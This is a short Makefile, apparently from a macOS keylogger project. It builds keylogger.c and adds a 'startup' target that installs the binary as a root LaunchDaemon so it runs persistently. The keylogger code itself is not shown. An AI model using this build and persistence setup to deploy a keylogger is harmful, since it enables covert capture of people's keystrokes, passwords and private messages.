CC=gcc
CFLAGS=-framework ApplicationServices -framework Carbon
SOURCES=keylogger.c
EXECUTABLE=keylogger
PLIST=keylogger.plist
INSTALLDIR=/usr/local/bin

all: $(SOURCES)
	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)

install: all
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)

uninstall:
	rm $(INSTALLDIR)/$(EXECUTABLE)
	sudo launchctl unload /Library/LaunchDaemons/keylogger.plist
	rm /Library/LaunchDaemons/$(PLIST)

startup: install
	cp $(PLIST) /Library/LaunchDaemons
	sudo launchctl load /Library/LaunchDaemons/keylogger.plist

clean:
	rm $(EXECUTABLE)
